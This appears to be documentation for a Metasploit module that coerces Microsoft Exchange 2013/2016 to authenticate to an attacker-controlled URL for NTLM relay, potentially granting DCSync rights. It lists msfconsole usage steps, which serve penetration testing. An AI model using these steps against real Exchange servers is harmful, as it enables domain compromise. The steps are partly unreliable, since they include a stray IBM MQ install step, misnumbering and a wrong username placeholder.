## Vulnerable Application

  * Microsoft Exchange 2013 and 2016
  * Tested on Exchange 2016
  * Usage:
    * Download and install Exchange Server within a Windows domain
    * Setup a mailbox with a domain user
    * Run the module
    * Relay the NTLM authentication to the DC

## Verification Steps

  Example steps in this format (is also in the PR):

  1. Install IBM MQ Server 7.5, 8, or 9
  2. Start msfconsole
  3. Do: ```use auxiliary/scanner/http/exchange_web_server_pushsubscription```
  4. Do: ```set attacker_url <url>```
  6. Do: ```set rport <target_port>```
  5. Do: ```set rhost <target_IP>```
  6. Do: ```set domain <domain_name>```
  6. Do: ```set password <user_pass>```
  6. Do: ```set username <user_pass>```
  7. Do: ```run```

## Options

  **The ATTACKER_URL option**

  This option should contain a URL under the attacker's control. This is where the Exchange will try to authenticate.

## Scenarios

  This module can be used to make a request to the Exchange server and force it to authenticate to a URL under our control. 
  An example scenario is that when this module is combined with an NTLM relay attack, if the Exchange server has the necessary permissions it is possible to grant us DCSync rights.
